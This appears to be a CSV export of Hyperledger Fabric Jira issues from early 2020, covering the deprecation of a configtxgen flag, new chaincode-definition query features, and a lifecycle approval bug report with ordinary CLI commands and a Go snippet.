2020-01-22T16:16:56.2164138Z [31m2020-01-22 15:57:48.165 UTC [vscc] Validate -> ERRO 001[0m VSCC error: stateBasedValidator.Validate failed, err validation of endorsement policy for chaincode samplecc in tx 4:0 failed: signature set did not satisfy policy/ code placeholder
{code}
[|https://dev.azure.com/Hyperledger/495b205d-295a-4493-a785-099a0d6b840e/_apis/build/builds/5826/logs/12]",,btl5037,davidkhala,dongming,scottz,vijaypunugubati,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,4a0ff4b05b13b252bb0688e4c4ca834f8f580fd9,Unset,No,,,"1|hzwqfp:q",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,davidkhala,dongming,scottz,vijaypunugubati,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Aug/20 7:53 PM;davidkhala;Why do you think it is success?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove OutputAnchorPeersUpdate,FAB-17427,44102,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,caod,caod,23/Jan/20 3:11 AM,19/Apr/20 1:06 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-tools,,,,,,,,,0,,,,,,"Via discussion with [~jyellick], the [doOutputAnchorPeersUpdate|[https://github.com/hyperledger/fabric/blob/master/cmd/configtxgen/main.go#L77]] was likely a bad idea and has to have a lot of messy logic in it to accommodate for channel config updates. We should do things right and just use the configtx.yaml and go ahead and remove this function.",,caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-15574,,,No,,Unset,No,,,"1|i0182b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Apr/20 1:05 PM;denyeart;Deprecated in v2.0:

[https://github.com/hyperledger/fabric/pull/541]

Deprecate --outputAnchorPeersUpdate flag in configtxgen
 
Added to Epic that covers possible removals for v3.0.
 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add a warning to configtxgen and note in 2.0 release note about outputAnchorPeersUpdate flag deprecation,FAB-17428,44103,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,23/Jan/20 3:40 AM,28/Jan/20 1:50 AM,28/Oct/23 3:09 AM,24/Jan/20 8:08 AM,v2.0.0,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,,,,,,"We're removing outputAnchorPeerUpdate in FAB-17427, we'll need a warning in configtxgen about the deprecation and the release notes as well.

 

/cc [~jyellick] [~denyeart]",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0182j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jan/20 1:58 AM;caod;[https://github.com/hyperledger/fabric/pull/541];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Departure from SEMVER breaks dependencies,FAB-17429,44105,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,ryjones,ryjones,23/Jan/20 6:34 AM,08/Feb/20 4:13 AM,28/Oct/23 3:09 AM,08/Feb/20 4:13 AM,v1.4.3,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"[There is a breaking change between 1.4.1 and 1.4.3.|https://github.com/hyperledger/fabric-chaincode-evm/pull/26#discussion_r369789454]

1.4.3 should have been 1.5.x",,denyeart,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABCE-48,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n8s:",,,,Unset,Unset,,FABCE-48 encounters this - they have to pin the Fabric version to less than 1.4.3,,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Feb/20 4:13 AM;denyeart;Agreed. Going forward the project will try to ensure that only fixes go into 3rd digit releases. Nothing can be done for the past release, so I will close.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Operator: update tools to use high level APIs of new programming model in node-sdk,FAB-17430,44106,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,dongming,dongming,23/Jan/20 6:40 AM,10/Jun/20 12:29 PM,28/Oct/23 3:09 AM,10/Jun/20 12:29 PM,v2.0.0,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Many tests will need to change to use the new interfaces, to remove the install/instantiation steps and replace with approve/commit etc. In the current format, that means editing lots of runCases files and json test description files under CITest/ directory. In the new system test framework for k8s, it means changing the test input specification file. In addition, the tools and command functions must all be added. There will likely be many pieces to merge for this.",,btl5037,dongming,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16264,,,FAB-16772,FAB-16771,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,No,Unset,,FAB-16240,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb8i",,,,No,Unset,,(Please add steps to reproduce),,Yes,,,,,,Unset,,Unset,,(Please add usage information),btl5037,dongming,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jan/20 1:11 AM;scottz;[Deferred until SDK team decides which APIs to implement and completes them.];;;","16/Apr/20 11:55 AM;btl5037;This is unlikely to be possible as the NodeSDK has decided it wont publish a Fabric-Admin module. But will keep open pending conversations about receiving an unofficial fabric-admin module.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update core.yaml chaincode envs to use two digit versions,FAB-17431,44115,,Task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,denyeart,mbwhite,mbwhite,23/Jan/20 10:16 PM,27/Feb/20 11:49 PM,28/Oct/23 3:09 AM,27/Feb/20 11:49 PM,v2.0.0,,,,,,,,,v1.4.6,v2.0.0,,,fabric-release,,,,,,,,,0,,,,,,"Currently core.yml uses the latest docker images for the javaenv & nodeenv chaincode runtimes.

With the general move to not use latest on docker images, this will need to be updated. 

The proposal is that the version be the first two version digits of the fabric version.  i.e .1.4 or 2.0

This means that the patch level of the chaincode - fabric aren't tightly coupled - but they aree at the second level.

 

This needs resolving prior to GA",,denyeart,heatherp,jtonline,mbwhite,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i008rj:iwryk",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,heatherp,jtonline,mbwhite,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jan/20 10:28 PM;denyeart;https://github.com/hyperledger/fabric/pull/555 - master.
https://github.com/hyperledger/fabric/pull/570 - release-2.0.;;;","25/Feb/20 7:10 PM;denyeart;https://github.com/hyperledger/fabric/pull/735 - apply to javaenv for release-1.4;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extend lifecycle protos to query the details of the approved chaincode definition,FAB-17432,44122,43997,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,24/Jan/20 3:39 AM,23/Jul/21 7:00 AM,28/Oct/23 3:09 AM,01/Jul/20 7:25 PM,v2.0.0,,,,,,,,,v2.2.0,,,,fabric-peer,,,,,,,,,0,,,,,,"Currently, Fabric peer does not provide a function to query the details of
approved chaincode definitions.
    
On the other hand, Fabric admins will need to confirm/use the information
after approval for their operations.

So, we propose to add a function for querying the details of the approved
chaincode definition to Fabric peer CLI.

As a sub-task, we should extend lifecycle protos to add the function.
",,denyeart,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17433,FAB-17434,FAB-17435,FAB-17436,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0185n:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tatsu-sato,,,,,,,,,,,,,dependabot/bundler/docs/nokogiri-1.14.3,0.2.x,dependabot/bundler/docs/activesupport-6.0.6.1,dependabot/go_modules/bindings/go-apiv1/golang.org/x/text-0.3.8,0.1.x,dependabot/go_modules/golang.org/x/net-0.7.0,main,dependabot/go_modules/golang.org/x/text-0.3.8,dependabot/go_modules/bindings/go-apiv1/golang.org/x/net-0.7.0,dependabot/bundler/docs/commonmarker-0.23.9,dependabot/go_modules/bindings/go-apiv2/golang.org/x/net-0.7.0,release-2.3,release-2.2,dependabot/go_modules/bindings/go-apiv2/golang.org/x/text-0.3.8,github-settings,dependabot/go_modules/bindings/go-apiv2/golang.org/x/sys-0.1.0,dependabot/go_modules/golang.org/x/sys-0.1.0,dependabot/go_modules/bindings/go-apiv1/golang.org/x/sys-0.1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jan/20 6:45 AM;denyeart;https://github.com/hyperledger/fabric-protos/pull/25;;;","12/Mar/20 8:08 AM;tatsu-sato;[~denyeart]
As I asked fabric-pr-review channel on Rocketchat, 
it seems that the reviewers have been unassigned from this CR on github.
How do I get a review ?
Thank you for your support.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add _lifecycle function for querying the approved chaincode definition,FAB-17433,44123,43997,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,24/Jan/20 3:41 AM,01/Jul/20 7:25 PM,28/Oct/23 3:09 AM,01/Jul/20 7:25 PM,v2.0.0,,,,,,,,,v2.2.0,,,,fabric-peer,,,,,,,,,0,,,,,,"Currently, Fabric peer does not provide a function to query the details of
approved chaincode definitions.
    
On the other hand, Fabric admins will need to confirm/use the information
after approval for their operations.

So, we propose to add a function for querying the details of the approved
chaincode definition to Fabric peer CLI.

As a sub-task, _lifecycle should have a function to query the details of 
the approved chaincode definition.",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,FAB-17432,,,,,,,,,FAB-17434,FAB-17435,FAB-17436,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0185v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add CLI function to query the details of the approved chaincode definition,FAB-17434,44124,43997,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,24/Jan/20 3:43 AM,01/Jul/20 7:26 PM,28/Oct/23 3:09 AM,01/Jul/20 7:26 PM,v2.0.0,,,,,,,,,v2.2.0,,,,fabric-cli,,,,,,,,,0,,,,,,"Currently, Fabric peer does not provide a function to query the details of
approved chaincode definitions.
    
On the other hand, Fabric admins will need to confirm/use the information
after approval for their operations.

So, we propose to add a function for querying the details of the approved
chaincode definition to Fabric peer CLI.

As a sub-task, we should develop a CLI command to query the details of 
the approved chaincode definition.
",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,FAB-17432,FAB-17433,,,,,,,,FAB-17435,FAB-17436,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01863:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add integration test for queryapproved command,FAB-17435,44125,43997,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,24/Jan/20 3:44 AM,01/Jul/20 7:26 PM,28/Oct/23 3:09 AM,01/Jul/20 7:26 PM,v2.0.0,,,,,,,,,v2.2.0,,,,fabric-cli,,,,,,,,,0,,,,,,"Currently, Fabric peer does not provide a function to query the details of
approved chaincode definitions.
    
On the other hand, Fabric admins will need to confirm/use the information
after approval for their operations.

So, we propose to add ‘queryapproved’ command for querying the details of the approved
chaincode definition to Fabric peer CLI.

As a sub-task, we should add integration tests for the CLI command.",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,FAB-17434,FAB-17433,FAB-17432,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0186b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add documents for a CLI function to query the approved chaincode definition,FAB-17436,44126,43997,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,24/Jan/20 3:45 AM,01/Jul/20 7:26 PM,28/Oct/23 3:09 AM,01/Jul/20 7:26 PM,v2.0.0,,,,,,,,,v2.2.0,,,,fabric-docs,,,,,,,,,0,,,,,,"Currently, Fabric peer does not provide a function to query the details of
 approved chaincode definitions.

On the other hand, Fabric admins will need to confirm/use the information
 after approval for their operations.

So, we propose to add a function for querying the details of the approved
 chaincode definition to Fabric peer CLI.

As a sub-task, we should add some documents on how to use the CLI command.",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,FAB-17434,FAB-17433,FAB-17432,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0186j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failed to install chaincode with sample java,FAB-17437,44127,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,24/Jan/20 3:48 AM,01/Feb/20 12:35 AM,28/Oct/23 3:09 AM,01/Feb/20 12:35 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17320,FAB-17321,FAB-17332,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8w",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jan/20 2:51 AM;bharadwajambati1;For this, the Gradle version should be 5.0 or higher.[
https://github.com/hyperledger/fabric-test/pull/69];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create a CA,FAB-17438,44132,32076,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pandrejko,pandrejko,pandrejko,24/Jan/20 10:16 PM,15/May/20 8:42 PM,28/Oct/23 3:09 AM,14/May/20 9:08 PM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,,,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0187n:",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,release-2.1,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jan/20 10:17 PM;pandrejko;google doc notes: https://docs.google.com/document/d/1Wn1Wnws4ZZZuSzfYnwh6kWfTzVBc_ZwFVDGx74PSs-s/edit?usp=sharing;;;","03/Apr/20 4:58 AM;pandrejko;CR: https://github.com/hyperledger/fabric/pull/764;;;","13/May/20 11:04 PM;pandrejko;Add to Fabric docs toc: https://github.com/hyperledger/fabric/pull/1249;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make peer's MSPID available to chaincode,FAB-17439,44133,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,denyeart,denyeart,25/Jan/20 1:41 AM,29/Jan/20 1:09 PM,28/Oct/23 3:09 AM,29/Jan/20 1:09 PM,,,,,,,,,,v2.0.0,,,,fabric-ledger,fabric-peer,,,,,,,,0,,,,,,"In many scenarios, chaincode needs to perform access control. The chaincode requester certificate information including MSPID is already available to chaincode. In some scenarios chaincode needs to determine whether the client requestor is from the same org as the peer, for example when determining whether to return private data from a peer's implicit collection. Therefore, this story will make the peer's MSPID available to chaincode.",,caod,davidkhala,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10889,,,No,,Unset,No,,,"1|i008rj:iwrz4",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,davidkhala,denyeart,yacovm,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jan/20 1:58 AM;caod;We've decided to expose this through an env var to forego having to touch the protos;;;","25/Jan/20 3:04 AM;yacovm;This seems to me like a good use case for using a [decorator|https://github.com/hyperledger/fabric-chaincode-go/blob/master/shim/interfaces.go#L333].;;;","28/Jan/20 3:52 AM;caod;FABCG-13

FABCJ-276

FABCN-381;;;","29/Jan/20 9:52 AM;denyeart;exposed peer mspid to chaincode: https://github.com/hyperledger/fabric/pull/562

make fabric-chaincode-go api available: https://github.com/hyperledger/fabric-chaincode-go/pull/20

vendored to fabric and integration test to demonstrate usage: https://github.com/hyperledger/fabric/pull/584

merged in master and release-2.0.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve example usages of peer lifecycle chaincode commands with JSON output option,FAB-17440,44135,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,25/Jan/20 3:32 AM,19/Apr/20 1:03 PM,28/Oct/23 3:09 AM,19/Apr/20 1:03 PM,v2.0.0,,,,,,,,,v2.1.0,,,,fabric-docs,,,,,,,,,0,,,,,,"Some of the `peer lifecycle chaincode` subcommands support output format as JSON with `–output` option. 
Fabric admins need to use this JSON output to see the detailed information on chaincode definition
because default output shows only partial information.

On the other hand, the current command reference for `peer lifecycle chaincode` describe example usages with
the JSON output only for the `checkcommitreadiness` subcommand. 

To let more Fabric admins know about the useful option, 
the reference should explicitly describe example usages of the output options
for the remaining `queryinstalled` and ` querycommitted ` as well.
",,denyeart,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01883:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tatsu-sato,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jan/20 6:33 AM;denyeart;
@satota2  I've merged https://github.com/hyperledger/fabric/pull/559 in master, but please cherry pick to release-2.0 as well so that this can get into the upcoming v2.0 readthedocs. Thanks!;;;","19/Apr/20 1:03 PM;denyeart;It's in master and release-2.1, good enough I think to close.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
approveformyorg should allow update of only package ID,FAB-17441,44136,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,25/Jan/20 5:30 AM,19/Mar/20 1:14 PM,28/Oct/23 3:09 AM,05/Feb/20 3:49 AM,v2.0.0,,,,,,,,,v2.1.0,,,,fabric-peer,,,,,,,,,0,,,,,,"Currently, `ApproveChaincodeDefinitionForOrg` cannot redefine a uncommitted definition when attempting to update only the package ID and occurs the error as bellow.
{code:bash}
# Define a uncommitted definition
$ peer lifecycle chaincode approveformyorg -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --version 1 --init-required --package-id fabcar_1:a6b61184ef66929c1b6e6ad657c248e9ba6283080eb59250a93e1706eeffe981 --sequence 2

2020-01-24 01:00:18.095 UTC [chaincodeCmd] ClientWait -> INFO 001 txid [b5d63afa55bf13070b60e77c3a3ca95323d6dbd5a53205fedaffdc8f13e15f34] committed with status (VALID) at 

# Attempt to update only the package ID
$ peer lifecycle chaincode approveformyorg -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --version 1 --init-required --package-id test --sequence 2

Error: proposal failed with status: 500 - failed to invoke backing implementation of 'ApproveChaincodeDefinitionForMyOrg': attempted to redefine uncommitted sequence (2) for namespace fabcar with unchanged content
{code}
The above is caused by the following validation logic in `ApproveChaincodeDefinitionForOrg` function in `core/chaincode/lifecycle/lifecycle.go`:
{code:go}
if err := uncommittedParameters.Equal(cd.Parameters()); err == nil {
    return errors.Errorf(""attempted to redefine uncommitted sequence (%d) for namespace %s with unchanged content"", requestedSequence, ccname)
 }
{code}
